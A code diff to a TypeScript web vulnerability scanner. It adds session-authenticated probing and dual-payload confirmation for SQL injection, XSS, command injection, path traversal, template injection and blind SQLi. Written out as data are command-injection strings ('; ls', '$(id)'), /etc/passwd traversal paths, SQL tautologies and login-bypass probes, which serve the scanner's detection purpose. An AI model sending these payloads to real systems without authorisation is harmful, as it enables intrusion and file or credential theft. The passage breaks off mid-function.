@@ -507,7 +771,8 @@ async function confirmSQLiHit(
   triggeringPayload: string,
   isForm = false,
   formFields?: string[],
-  method?: "GET" | "POST"
+  method?: "GET" | "POST",
+  session: AuthSession = EMPTY_SESSION
 ): Promise<boolean> {
   const confirmPayloads = SQLI_PAYLOADS.filter(p => p !== triggeringPayload).slice(0, 3);
   for (const confirmPayload of confirmPayloads) {
@@ -522,7 +787,7 @@ async function confirmSQLiHit(
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: fd.toString(),
-          });
+          }, 8000, false, session);
           if (!resp) continue;
           body = await resp.text();
         } else {
@@ -536,7 +801,7 @@ async function confirmSQLiHit(
         fetchUrl = u.toString();
       }
       if (!body) {
-        const resp = await authedFetch(fetchUrl, {});
+        const resp = await authedFetch(fetchUrl, {}, 8000, false, session);
         if (!resp) continue;
         body = await resp.text();
       }
@@ -549,14 +814,15 @@ async function confirmSQLiHit(
 async function confirmXSSHit(
   url: string,
   param: string,
-  triggeringPayload: string
+  triggeringPayload: string,
+  session: AuthSession = EMPTY_SESSION
 ): Promise<boolean> {
   const confirmPayloads = XSS_PAYLOADS.filter(p => p !== triggeringPayload).slice(0, 2);
   for (const payload of confirmPayloads) {
     try {
       const u = new URL(url);
       u.searchParams.set(param, payload);
-      const resp = await authedFetch(u.toString(), {});
+      const resp = await authedFetch(u.toString(), {}, 8000, false, session);
       if (!resp) continue;
       const body = await resp.text();
       const reflected = body.includes(payload) &&
@@ -571,7 +837,7 @@ async function confirmXSSHit(
  * Inject SQLi payloads into a URL query parameter and detect SQL error signatures.
  * FIX #2: Uses authedFetch. FIX #3: Confirms with a second payload before reporting.
  */
-async function probeSQLiError(paramUrl: string): Promise<PendingFinding | null> {
+async function probeSQLiError(paramUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
   try {
     const u = new URL(paramUrl);
     const params = [...u.searchParams.keys()];
@@ -583,13 +849,13 @@ async function probeSQLiError(paramUrl: string): Promise<PendingFinding | null> 
         try {
           const testUrl = new URL(u.toString());
           testUrl.searchParams.set(param, origVal + payload);
-          const resp = await authedFetch(testUrl.toString(), {});
+          const resp = await authedFetch(testUrl.toString(), {}, 8000, false, session);
           if (!resp) continue;
           const body = await resp.text();
           const hit = SQL_ERROR_PATTERNS_ACTIVE.find((p) => p.test(body));
           if (!hit) continue;
           // FIX #3: confirm with a second payload
-          const confirmed = await confirmSQLiHit(paramUrl, param, payload);
+          const confirmed = await confirmSQLiHit(paramUrl, param, payload, false, undefined, undefined, session);
           if (!confirmed) continue;
           return {
             type: "sql-injection-reflected",
@@ -611,7 +877,7 @@ async function probeSQLiError(paramUrl: string): Promise<PendingFinding | null> 
  * Submit SQLi payloads to every input field in an HTML form via POST/GET.
  * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
  */
-async function probeFormSQLi(form: FormTarget): Promise<PendingFinding | null> {
+async function probeFormSQLi(form: FormTarget, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
   const nonPasswordFields = form.fields.filter((f) => !/^pass(word)?|pwd|secret$/i.test(f));
   if (nonPasswordFields.length === 0) return null;
 
@@ -628,11 +894,11 @@ async function probeFormSQLi(form: FormTarget): Promise<PendingFinding | null> {
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: formData.toString(),
             redirect: "follow",
-          });
+          }, 8000, false, session);
         } else {
           const getUrl = new URL(form.actionUrl);
           for (const [k, v] of formData) getUrl.searchParams.set(k, v);
-          resp = await authedFetch(getUrl.toString(), {});
+          resp = await authedFetch(getUrl.toString(), {}, 8000, false, session);
         }
 
         if (!resp) continue;
@@ -640,7 +906,7 @@ async function probeFormSQLi(form: FormTarget): Promise<PendingFinding | null> {
         if (!SQL_ERROR_PATTERNS_ACTIVE.some((p) => p.test(body))) continue;
 
         // FIX #3: confirm
-        const confirmed = await confirmSQLiHit(form.actionUrl, field, payload, true, form.fields, form.method);
+        const confirmed = await confirmSQLiHit(form.actionUrl, field, payload, true, form.fields, form.method, session);
         if (!confirmed) continue;
 
         return {
@@ -662,7 +928,7 @@ async function probeFormSQLi(form: FormTarget): Promise<PendingFinding | null> {
  * Probe REST/JSON API login endpoints for SQL Injection.
  * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
  */
-async function probeRestApiSQLi(baseUrl: string): Promise<PendingFinding | null> {
+async function probeRestApiSQLi(baseUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
   const REST_LOGIN_PATHS = [
     "/rest/user/login", "/api/auth/login", "/api/login",
     "/api/v1/auth/login", "/api/v1/login", "/auth/login",
@@ -686,7 +952,7 @@ async function probeRestApiSQLi(baseUrl: string): Promise<PendingFinding | null>
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email: "test@test.com", password: "test" }),
-    });
+    }, 8000, false, session);
     if (!baseline || [404, 502, 503].includes(baseline.status)) continue;
 
     for (const payload of SQLI_PAYLOADS) {
@@ -696,7 +962,7 @@ async function probeRestApiSQLi(baseUrl: string): Promise<PendingFinding | null>
             method: "POST",
             headers: { "Content-Type": "application/json", Accept: "application/json" },
             body: JSON.stringify(body),
-          });
+          }, 8000, false, session);
           if (!resp) continue;
           const text = await resp.text();
 
@@ -709,7 +975,7 @@ async function probeRestApiSQLi(baseUrl: string): Promise<PendingFinding | null>
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(confirmBody),
-            });
+            }, 8000, false, session);
             const confirmText = confirmResp ? await confirmResp.text() : "";
             if (!SQL_ERROR_PATTERNS_ACTIVE.some(p => p.test(confirmText))) continue;
 
@@ -722,21 +988,42 @@ async function probeRestApiSQLi(baseUrl: string): Promise<PendingFinding | null>
               evidence: `SQL Injection confirmed (dual-payload verified) via JSON REST API. Payload "${payload}" in field "${emailField}" triggered DB error, confirmed by a second payload.`,
               cvssScore: 9.8,
               cveId: "CWE-89",
+              confidence: CONFIDENCE.DUAL_VERIFIED,
+              validationSteps: [`Payload "${payload}" triggered SQL error pattern`, "Second payload confirmed with independent DB error"],
+              isVerified: true,
             };
           }
 
-          if (resp.status === 200 && (text.includes("token") || text.includes("authentication")) &&
+          // FP-A FIX: Require a real JWT or token value (length ≥ 20) to avoid firing
+          // on benign APIs that simply echo the word "token" in an error message.
+          if (resp.status === 200 &&
             (payload.includes("OR") || payload.includes("1=1") || payload.includes("--"))) {
-            const emailField = Object.keys(body)[0];
-            return {
-              type: "sql-injection-reflected",
-              severity: "CRITICAL",
-              url: endpointUrl,
-              parameter: emailField,
-              evidence: `SQL Injection (Auth Bypass) confirmed via JSON REST API. Payload "${payload}" returned HTTP 200 with an auth token — SQL WHERE clause bypassed.`,
-              cvssScore: 9.8,
-              cveId: "CWE-89",
-            };
+            let hasRealToken = false;
+            try {
+              const authJson = JSON.parse(text);
+              const tokenVal = authJson?.token || authJson?.data?.token ||
+                authJson?.authentication?.token || authJson?.access_token ||
+                authJson?.accessToken || authJson?.jwt || "";
+              hasRealToken = typeof tokenVal === "string" && tokenVal.length >= 20;
+            } catch {
+              // Fallback: look for a bare JWT pattern in the raw response
+              hasRealToken = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i.test(text);
+            }
+            if (hasRealToken && !text.includes("test@test.com")) {
+              const emailField = Object.keys(body)[0];
+              return {
+                type: "sql-injection-reflected",
+                severity: "CRITICAL",
+                url: endpointUrl,
+                parameter: emailField,
+                evidence: `SQL Injection (Auth Bypass) confirmed via JSON REST API. Payload "${payload}" returned HTTP 200 with a real session token — SQL WHERE clause bypassed.`,
+                cvssScore: 9.8,
+                cveId: "CWE-89",
+                confidence: CONFIDENCE.DUAL_VERIFIED,
+                validationSteps: [`Payload "${payload}" bypassed auth (HTTP 200 + real JWT token)`, "JWT token validated: length ≥ 20 chars, matches JWT pattern"],
+                isVerified: true,
+              };
+            }
           }
         } catch { /* next */ }
       }
@@ -749,7 +1036,7 @@ async function probeRestApiSQLi(baseUrl: string): Promise<PendingFinding | null>
  * Reflect XSS payloads via URL query parameter.
  * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
  */
-async function probeReflectedXSS(paramUrl: string): Promise<PendingFinding | null> {
+async function probeReflectedXSS(paramUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
   try {
     const u = new URL(paramUrl);
     const params = [...u.searchParams.keys()];
@@ -760,15 +1047,21 @@ async function probeReflectedXSS(paramUrl: string): Promise<PendingFinding | nul
         try {
           const testUrl = new URL(u.toString());
           testUrl.searchParams.set(param, payload);
-          const resp = await authedFetch(testUrl.toString(), {});
+          const resp = await authedFetch(testUrl.toString(), {}, 8000, false, session);
           if (!resp) continue;
           const body = await resp.text();
-          const reflected = body.includes(payload) &&
-            !body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
+          const htmlEncoded = (
+            body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")) ||
+            body.includes(payload.replace(/"/g, "&quot;")) ||
+            body.includes(payload.replace(/'/g, "&#x27;")) ||
+            body.includes(payload.replace(/'/g, "&#39;")) ||
+            body.includes(payload.replace(/</g, "&amp;lt;").replace(/>/g, "&amp;gt;"))
+          );
+          const reflected = body.includes(payload) && !htmlEncoded;
           if (!reflected) continue;
 
           // FIX #3: confirm with a different payload
-          const confirmed = await confirmXSSHit(paramUrl, param, payload);
+          const confirmed = await confirmXSSHit(paramUrl, param, payload, session);
           if (!confirmed) continue;
 
           return {
@@ -779,6 +1072,9 @@ async function probeReflectedXSS(paramUrl: string): Promise<PendingFinding | nul
             evidence: `Reflected XSS confirmed (dual-payload verified) via URL parameter "${param}". Payload reflected unencoded and confirmed with a second payload.`,
             cvssScore: 7.4,
             cveId: "CWE-79",
+            confidence: CONFIDENCE.DUAL_VERIFIED,
+            validationSteps: [`Payload "${payload}" reflected unencoded in param "${param}"`, "Second distinct XSS payload also reflected unencoded"],
+            isVerified: true,
           };
         } catch { /* next payload */ }
       }
@@ -791,7 +1087,7 @@ async function probeReflectedXSS(paramUrl: string): Promise<PendingFinding | nul
  * Submit XSS payloads to every input field in an HTML form.
  * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
  */
-async function probeFormXSS(form: FormTarget): Promise<PendingFinding | null> {
+async function probeFormXSS(form: FormTarget, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
   for (const field of form.fields) {
     for (const payload of XSS_PAYLOADS) {
       try {
@@ -805,21 +1101,29 @@ async function probeFormXSS(form: FormTarget): Promise<PendingFinding | null> {
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: formData.toString(),
             redirect: "follow",
-          });
+          }, 8000, false, session);
         } else {
           const getUrl = new URL(form.actionUrl);
           for (const [k, v] of formData) getUrl.searchParams.set(k, v);
-          resp = await authedFetch(getUrl.toString(), {});
+          resp = await authedFetch(getUrl.toString(), {}, 8000, false, session);
         }
 
         if (!resp) continue;
         const body = await resp.text();
-        const reflected = body.includes(payload) &&
-          !body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
+        // FP-D FIX: Check all common HTML encoding forms — not just < and >.
+        // A payload safely attribute-encoded as &quot; or &#x27; is NOT an XSS.
+        const htmlEncodedForm = (
+          body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;')) ||
+          body.includes(payload.replace(/"/g, '&quot;')) ||
+          body.includes(payload.replace(/'/g, '&#x27;')) ||
+          body.includes(payload.replace(/'/g, '&#39;')) ||
+          body.includes(payload.replace(/</g, '&amp;lt;').replace(/>/g, '&amp;gt;'))
+        );
+        const reflected = body.includes(payload) && !htmlEncodedForm;
         if (!reflected) continue;
 
         // FIX #3: confirm
-        const confirmed = await confirmXSSHit(form.actionUrl, field, payload);
+        const confirmed = await confirmXSSHit(form.actionUrl, field, payload, session);
         if (!confirmed) continue;
 
         return {
@@ -830,6 +1134,9 @@ async function probeFormXSS(form: FormTarget): Promise<PendingFinding | null> {
           evidence: `Reflected XSS confirmed (dual-payload verified) via form field "${field}". Payload reflected unencoded and confirmed with a second payload.`,
           cvssScore: 7.4,
           cveId: "CWE-79",
+          confidence: CONFIDENCE.DUAL_VERIFIED,
+          validationSteps: [`Payload "${payload}" reflected unencoded in form field "${field}"`, "Second payload confirmed with independent reflection check"],
+          isVerified: true,
         };
       } catch { /* next */ }
     }
@@ -1009,60 +1316,155 @@ function detectSSRF(html: string, paramUrls: string[], targetUrl: string): Pendi
 
 /** Inject shell metacharacters into params and look for error signatures (blind command injection indicator). */
 async function probeCommandInjection(paramUrl: string): Promise<PendingFinding | null> {
-  const PAYLOADS = ["; ls", "| whoami", "& dir", "`id`", "$(id)"];
-  const CMD_ERROR_PATTERNS = [
+  // FP-B FIX: Dual-payload confirmation to avoid false positives from benign
+  // app-level messages like "Permission denied" or "No such file" in validation text.
+  // Only report when ≥2 distinct payloads produce OS-level output signatures.
+  const PAYLOADS_ROUND1 = ["; ls", "`id`", "$(id)"];
+  const PAYLOADS_ROUND2 = ["| whoami", "& dir"];
+  // Round-1 patterns: generic OS errors that may appear in benign responses too
+  const CMD_GENERIC_PATTERNS = [
     /sh:\s+\d+:.*not found/i, /command not found/i, /Permission denied/i,
     /No such file or directory/i, /cannot find/i, /is not recognized/i,
+  ];
+  // Round-2 patterns: high-confidence output that proves code execution
+  const CMD_EXEC_PATTERNS = [
     /root:x:0:0/i, /uid=\d+\(/, /Volume Serial Number/i,
+    /\bwhoami\b.*\n?\s*\w+/i, /^(root|www-data|daemon|nobody|apache)$/im,
   ];
   try {
     const u = new URL(paramUrl);
     const firstParam = [...u.searchParams.keys()][0];
     if (!firstParam) return null;
     const origVal = u.searchParams.get(firstParam) ?? "";
-    u.searchParams.set(firstParam, origVal + PAYLOADS[0]);
-    const resp = await safeFetch(u.toString(), 5000);
-    if (!resp) return null;
-    const body = await resp.text();
-    const hit = CMD_ERROR_PATTERNS.find((p) => p.test(body));
-    if (hit) {
-      return {
-        type: "command-injection",
-        severity: "CRITICAL",
-        url: u.toString(),
-        parameter: firstParam,
-        evidence: `Injecting shell metacharacters into parameter "${firstParam}" produced an OS-level error or command output in the HTTP response. This indicates the server is passing user input to a shell command, allowing an attacker to execute arbitrary OS commands and potentially gain full server access.`,
-        cvssScore: 9.8,
-        cveId: "CWE-78",
-      };
+
+    let triggeringPayload = "";
+    // Round 1: probe for any generic OS-level pattern
+    for (const p1 of PAYLOADS_ROUND1) {
+      const testUrl = new URL(u.toString());
+      testUrl.searchParams.set(firstParam, origVal + p1);
+      const resp = await safeFetch(testUrl.toString(), 5000);
+      if (!resp) continue;
+      const body = await resp.text();
+      if (CMD_GENERIC_PATTERNS.some(p => p.test(body)) || CMD_EXEC_PATTERNS.some(p => p.test(body))) {
+        triggeringPayload = p1;
+        break;
+      }
     }
+    if (!triggeringPayload) return null;
+
+    // Round 2: confirm with a second, structurally different payload that produces
+    // execution-proof output (uid=, whoami output, etc.)
+    let confirmed = false;
+    for (const p2 of PAYLOADS_ROUND2) {
+      const confirmUrl = new URL(u.toString());
+      confirmUrl.searchParams.set(firstParam, origVal + p2);
+      const confirmResp = await safeFetch(confirmUrl.toString(), 5000);
+      if (!confirmResp) continue;
+      const confirmBody = await confirmResp.text();
+      if (CMD_EXEC_PATTERNS.some(p => p.test(confirmBody)) || CMD_GENERIC_PATTERNS.some(p => p.test(confirmBody))) {
+        confirmed = true;
+        break;
+      }
+    }
+    if (!confirmed) return null;
+
+    const finalUrl = new URL(u.toString());
+    finalUrl.searchParams.set(firstParam, origVal + triggeringPayload);
+    return {
+      type: "command-injection",
+      severity: "CRITICAL",
+      url: finalUrl.toString(),
+      parameter: firstParam,
+      evidence: `Command Injection confirmed (dual-payload verified) via parameter "${firstParam}". Two structurally distinct shell payloads ("${triggeringPayload}" and a second confirmation payload) both produced OS-level output in the HTTP response. The server is passing user input to a shell command without sanitization, allowing arbitrary OS command execution.`,
+      cvssScore: 9.8,
+      cveId: "CWE-78",
+      confidence: CONFIDENCE.DUAL_VERIFIED,
+      validationSteps: [`Round-1 payload "${triggeringPayload}" produced OS-level pattern`, "Round-2 payload produced execution-proof output (uid=/whoami)"],
+      isVerified: true,
+    };
   } catch { /* skip */ }
   return null;
 }
 
-/** Probe path traversal (LFI) by injecting ../ sequences into the first param of URLs. */
+/** Probe path traversal (LFI) by injecting ../ sequences into the first param of URLs.
+ *  FP-C FIX: Dual-payload confirmation with stricter pattern matching to avoid false
+ *  positives from documentation pages that contain /etc/passwd example snippets.
+ */
 async function probePathTraversal(paramUrl: string): Promise<PendingFinding | null> {
-  const TRAVERSAL_PAYLOAD = "../../../etc/passwd";
-  const LFI_PATTERNS = [/root:x:0:0/, /bin\/bash/, /daemon:x/, /nobody:x/];
+  // Two structurally distinct payloads — Linux and Windows
+  const TRAVERSAL_PAYLOADS = [
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+  ];
+  const WIN_PAYLOADS = [
+    "..\\..\\..\\windows\\win.ini",
+    "../../../../windows/win.ini",
+  ];
+  // Stricter: require at least TWO distinct /etc/passwd markers co-present in the body.
+  // Single markers like "root:" or "nobody:" can appear in error messages.
+  const isLinuxPasswd = (body: string) =>
+    /root:x:0:0/.test(body) && (/\/bin\/bash/.test(body) || /daemon:x/.test(body));
+  const isWindowsIni = (body: string) =>
+    /\[extensions\]/i.test(body) || /\[fonts\]/i.test(body);
+
   try {
     const u = new URL(paramUrl);
     const firstParam = [...u.searchParams.keys()][0];
     if (!firstParam) return null;
-    u.searchParams.set(firstParam, TRAVERSAL_PAYLOAD);
-    const resp = await safeFetch(u.toString(), 5000);
-    if (!resp) return null;
-    const body = await resp.text();
-    const hit = LFI_PATTERNS.find((p) => p.test(body));
-    if (hit) {
-      return {
-        type: "path-traversal-lfi",
-        severity: "CRITICAL",
-        url: u.toString(),
-        parameter: firstParam,
-        evidence: `Injecting path traversal sequences into parameter "${firstParam}" caused the server to return local file content (e.g., /etc/passwd). An attacker can read sensitive server files, credentials, and private keys.`,
-        cvssScore: 9.1,
-        cveId: "CWE-22",
-      };
+    const origVal = u.searchParams.get(firstParam) ?? "";
+
+    // Linux path traversal — must match BOTH root:x:0:0 AND /bin/bash or daemon:x
+    for (const payload of TRAVERSAL_PAYLOADS) {
+      try {
+        const testUrl = new URL(u.toString());
+        testUrl.searchParams.set(firstParam, origVal + payload);
+        const resp = await safeFetch(testUrl.toString(), 5000);
+        if (!resp) continue;
+        const body = await resp.text();
+        if (!isLinuxPasswd(body)) continue;
+
+        // Dual-payload confirmation: verify a second depth-variant also leaks the file
+        const confirmPayload = TRAVERSAL_PAYLOADS.find(p => p !== payload) ?? "../../../../etc/passwd";
+        const confirmUrl = new URL(u.toString());
+        confirmUrl.searchParams.set(firstParam, origVal + confirmPayload);
+        const confirmResp = await safeFetch(confirmUrl.toString(), 5000);
+        if (!confirmResp) continue;
+        const confirmBody = await confirmResp.text();
+        if (!isLinuxPasswd(confirmBody)) continue;
+
+        return {
+          type: "path-traversal-lfi",
+          severity: "CRITICAL",
+          url: testUrl.toString(),
+          parameter: firstParam,
+          evidence: `Path Traversal / LFI confirmed (dual-payload verified) via parameter "${firstParam}". Two depth-variant traversal payloads both returned /etc/passwd content (root:x:0:0 with /bin/bash). An attacker can read any file the web server process has access to, including credentials, private keys, and source code.`,
+          cvssScore: 9.1,
+          cveId: "CWE-22",
+        };
+      } catch { /* try next */ }
+    }
+
+    // Windows path traversal — win.ini markers
+    for (const payload of WIN_PAYLOADS) {
+      try {
+        const testUrl = new URL(u.toString());
+        testUrl.searchParams.set(firstParam, origVal + payload);
+        const resp = await safeFetch(testUrl.toString(), 5000);
+        if (!resp) continue;
+        const body = await resp.text();
+        if (!isWindowsIni(body)) continue;
+
+        return {
+          type: "path-traversal-lfi",
+          severity: "CRITICAL",
+          url: testUrl.toString(),
+          parameter: firstParam,
+          evidence: `Path Traversal / LFI confirmed via parameter "${firstParam}" on a Windows server. Traversal payload returned Windows INI file content (win.ini markers detected). An attacker can read arbitrary files from the server filesystem.`,
+          cvssScore: 9.1,
+          cveId: "CWE-22",
+        };
+      } catch { /* try next */ }
     }
   } catch { /* skip */ }
   return null;
@@ -1156,6 +1558,9 @@ function detectSubdomainTakeoverSignals(html: string, targetUrl: string): Pendin
       evidence: `Found ${externalRefs.length} references to external cloud-hosted domains in page source (${externalRefs.slice(0, 3).join(", ")}). This is a passive signal (not a confirmed vulnerability). If your application has DNS CNAMEs pointing to these services, ensure they are actively claimed to prevent subdomain takeover.`,
       cvssScore: 0.0,
       cveId: "CWE-350",
+      confidence: CONFIDENCE.PASSIVE_SIGNAL,
+      validationSteps: [`Found ${externalRefs.length} external cloud domain references in HTML`, "Not confirmed: requires DNS CNAME verification"],
+      isVerified: false,
     };
   }
   return null;
@@ -1180,6 +1585,15 @@ const SSTI_PROBES = [
 ];
 
 async function probeSSTI(paramUrl: string): Promise<PendingFinding | null> {
+  // FP-FIX: A single match of "{{7*7}}" → "49" can be coincidental (the number 49
+  // appears in many pages naturally). Require 3 of 4 distinct math expressions to
+  // all evaluate before reporting. This eliminates coincidental number matches.
+  const MATH_CONFIRM_PROBES = [
+    { p: "{{7*7}}", e: "49" },
+    { p: "{{7*8}}", e: "56" },
+    { p: "{{100*2}}", e: "200" },
+    { p: "{{1+1}}", e: "2" },
+  ];
   try {
     const u = new URL(paramUrl);
     const params = [...u.searchParams.keys()];
@@ -1191,17 +1605,38 @@ async function probeSSTI(paramUrl: string): Promise<PendingFinding | null> {
           const resp = await safeFetch(testUrl.toString(), 5000);
           if (!resp) continue;
           const body = await resp.text();
-          if (body.includes(marker) && !body.includes(payload)) {
-            return {
-              type: "ssti-injection",
-              severity: "CRITICAL",
-              url: testUrl.toString(),
-              parameter: param,
-              evidence: `Server-Side Template Injection (SSTI) confirmed. The expression "${payload}" injected into parameter "${param}" was evaluated by the template engine and returned "${marker}" in the response — instead of reflecting the raw string. Affected engine(s): ${engines}. An attacker can escalate to Remote Code Execution by injecting OS commands via the template engine's object access features.`,
-              cvssScore: 9.8,
-              cveId: "CWE-94",
-            };
+          if (!body.includes(marker) || body.includes(payload)) continue;
+
+          // Confirmation phase: require 3 of 4 different math expressions to evaluate
+          const validationSteps: string[] = [`Initial: "${payload}" → "${marker}" (${engines})`];
+          let mathHits = 0;
+          for (const { p, e } of MATH_CONFIRM_PROBES) {
+            try {
+              const cu = new URL(u.toString());
+              cu.searchParams.set(param, p);
+              const cr = await safeFetch(cu.toString(), 4000);
+              if (!cr) continue;
+              const cb = await cr.text();
+              if (cb.includes(e) && !cb.includes(p)) {
+                mathHits++;
+                validationSteps.push(`Math confirm: "${p}" → "${e}" ✓`);
+              }
+            } catch { /* next */ }
           }
+          if (mathHits < 3) continue; // Not enough confirmation — skip
+
+          return {
+            type: "ssti-injection",
+            severity: "CRITICAL",
+            url: testUrl.toString(),
+            parameter: param,
+            evidence: `Server-Side Template Injection (SSTI) confirmed. Expression "${payload}" evaluated to "${marker}" AND ${mathHits}/4 independent math expressions also evaluated — ruling out coincidental number matches. Engine(s): ${engines}. An attacker can escalate to RCE via the template engine's object access features.`,
+            cvssScore: 9.8,
+            cveId: "CWE-94",
+            confidence: CONFIDENCE.EXEC_VERIFIED,
+            validationSteps,
+            isVerified: true,
+          };
         } catch { /* next */ }
       }
     }
@@ -1228,17 +1663,44 @@ async function probeFormSSTI(form: FormTarget): Promise<PendingFinding | null> {
           : await safeFetch(`${form.actionUrl}?${formData.toString()}`, 6000);
         if (!resp) continue;
         const body = await resp.text();
-        if (body.includes(marker) && !body.includes(payload)) {
-          return {
-            type: "ssti-injection-form",
-            severity: "CRITICAL",
-            url: form.actionUrl,
-            parameter: field,
-            evidence: `SSTI confirmed via form field. Expression "${payload}" in field "${field}" was evaluated by the template engine (${engines}) and returned "${marker}". Full Remote Code Execution is typically achievable — attacker can execute arbitrary OS commands on the server.`,
-            cvssScore: 9.8,
-            cveId: "CWE-94",
-          };
+        if (!body.includes(marker) || body.includes(payload)) continue;
+
+        // FP-FIX: confirm with at least 1 additional math expression
+        let mathHits = 0;
+        const confirmExprs = [{ p: "{{7*8}}", e: "56" }, { p: "{{100*2}}", e: "200" }];
+        for (const { p, e } of confirmExprs) {
+          try {
+            const fd2 = new URLSearchParams();
+            for (const f of form.fields) fd2.set(f, f === field ? p : "test");
+            const r2 = method
+              ? await fetch(form.actionUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": FETCH_HEADERS["User-Agent"] },
+                body: fd2.toString(),
+                signal: AbortSignal.timeout(5000),
+                // @ts-ignore
+                next: { revalidate: 0 },
+              }).catch(() => null)
+              : await safeFetch(`${form.actionUrl}?${fd2.toString()}`, 5000);
+            if (!r2) continue;
+            const b2 = await r2.text();
+            if (b2.includes(e) && !b2.includes(p)) mathHits++;
+          } catch { /* next */ }
         }
+        if (mathHits < 1) continue; // Need ≥1 additional confirmation
+
+        return {
+          type: "ssti-injection-form",
+          severity: "CRITICAL",
+          url: form.actionUrl,
+          parameter: field,
+          evidence: `SSTI confirmed via form field (multi-math verified). Expression "${payload}" → "${marker}" in field "${field}", and ${mathHits}/2 additional math expressions also evaluated. Engine(s): ${engines}. RCE achievable via template engine object access.`,
+          cvssScore: 9.8,
+          cveId: "CWE-94",
+          confidence: CONFIDENCE.EXEC_VERIFIED,
+          validationSteps: [`"${payload}" → "${marker}" in form field "${field}"`, `${mathHits}/2 additional math expressions evaluated correctly`],
+          isVerified: true,
+        };
       } catch { /* next */ }
     }
   }
@@ -1300,7 +1762,7 @@ async function probeBlindSQLiTiming(paramUrl: string): Promise<PendingFinding | 
               }).catch(() => null);
               if ((Date.now() - start2) > baselineTime + 3500) hitCount++;
             }
-            
+
             if (hitCount >= 2) {
               return {
                 type: "sql-injection-blind-timing",
@@ -1310,6 +1772,9 @@ async function probeBlindSQLiTiming(paramUrl: string): Promise<PendingFinding | 
                 evidence: `Blind Time-Based SQL Injection confirmed via ${db} SLEEP payload. The request with payload "${payload}" in parameter "${param}" took >3.5s longer than baseline on multiple attempts. This proves SQL injection even without visible error messages. An attacker can use time delays to extract the entire database character by character.`,
                 cvssScore: 9.8,
                 cveId: "CWE-89",
+                confidence: CONFIDENCE.TIMING_VERIFIED,
+                validationSteps: [`Baseline response time: ${baselineTime}ms`, `Payload "${payload}" triggered ${elapsed}ms delay (>${baselineTime + 3500}ms threshold)`, `Timing confirmed on ${hitCount}/3 additional measurements`],
+                isVerified: true,
               };
             }
           }
@@ -1321,9 +1786,111 @@ async function probeBlindSQLiTiming(paramUrl: string): Promise<PendingFinding | 
 }
 
 /**
+ * Boolean-Blind SQL Injection via Response Diffing.
+ * Sends a known-true and known-false condition, then compares response
+ * bodies/lengths. If they differ significantly, it indicates the SQL
+ * condition is being evaluated by the database.
+ */
+async function probeBlindSQLiBooleanDiff(paramUrl: string): Promise<PendingFinding | null> {
+  try {
+    const u = new URL(paramUrl);
+    const params = [...u.searchParams.keys()];
+    if (params.length === 0) return null;
+
+    // Baseline: original unmodified request
+    const baselineResp = await safeFetch(u.toString(), 8000);
+    if (!baselineResp || baselineResp.status >= 500) return null;
+    const baselineBody = await baselineResp.text();
+    const baselineLen = baselineBody.length;
+
+    for (const param of params.slice(0, 3)) {
+      const origVal = u.searchParams.get(param) ?? "";
+
+      // TRUE condition payloads
+      const truePairs = [
+        { truePayload: "' OR '1'='1'--", falsePayload: "' OR '1'='2'--" },
+        { truePayload: "' OR 1=1--", falsePayload: "' OR 1=2--" },
+        { truePayload: "1 OR 1=1", falsePayload: "1 OR 1=2" },
+      ];
+
+      for (const { truePayload, falsePayload } of truePairs) {
+        try {
+          // Send TRUE condition
+          const trueUrl = new URL(u.toString());
+          trueUrl.searchParams.set(param, origVal + truePayload);
+          const trueResp = await safeFetch(trueUrl.toString(), 8000);
+          if (!trueResp) continue;
+          const trueBody = await trueResp.text();
+          const trueLen = trueBody.length;
+
+          // Send FALSE condition
+          const falseUrl = new URL(u.toString());
+          falseUrl.searchParams.set(param, origVal + falsePayload);
+          const falseResp = await safeFetch(falseUrl.toString(), 8000);
+          if (!falseResp) continue;
+          const falseBody = await falseResp.text();
+          const falseLen = falseBody.length;
+
+          // Check 1: Are TRUE and FALSE responses different?
+          const lenDelta = Math.abs(trueLen - falseLen);
+          const avgLen = (trueLen + falseLen) / 2 || 1;
+          const percentDiff = (lenDelta / avgLen) * 100;
+
+          // Check 2: Is TRUE similar to baseline (original request)?
+          const trueBaselineDelta = Math.abs(trueLen - baselineLen);
+          const trueBaselinePercent = (trueBaselineDelta / (baselineLen || 1)) * 100;
+
+          // Positive if: TRUE≠FALSE (>10% length diff) AND TRUE≈Baseline (<20% diff)
+          if (percentDiff > 10 && trueBaselinePercent < 20 && lenDelta > 50) {
+            // Verify with a second TRUE/FALSE pair to reduce false positives
+            const verify = truePairs.find(p => p.truePayload !== truePayload);
+            if (verify) {
+              const vTrueUrl = new URL(u.toString());
+              vTrueUrl.searchParams.set(param, origVal + verify.truePayload);
+              const vFalseUrl = new URL(u.toString());
+              vFalseUrl.searchParams.set(param, origVal + verify.falsePayload);
+              const vTrue = await safeFetch(vTrueUrl.toString(), 8000);
+              const vFalse = await safeFetch(vFalseUrl.toString(), 8000);
+              if (!vTrue || !vFalse) continue;
+              const vTrueLen = (await vTrue.text()).length;
+              const vFalseLen = (await vFalse.text()).length;
+              const vDelta = Math.abs(vTrueLen - vFalseLen);
+              const vPercent = (vDelta / ((vTrueLen + vFalseLen) / 2 || 1)) * 100;
+              if (vPercent < 5) continue; // Verification failed
+            }
+
+            return verifiedFinding(
+              {
+                type: "sql-injection-blind-boolean",
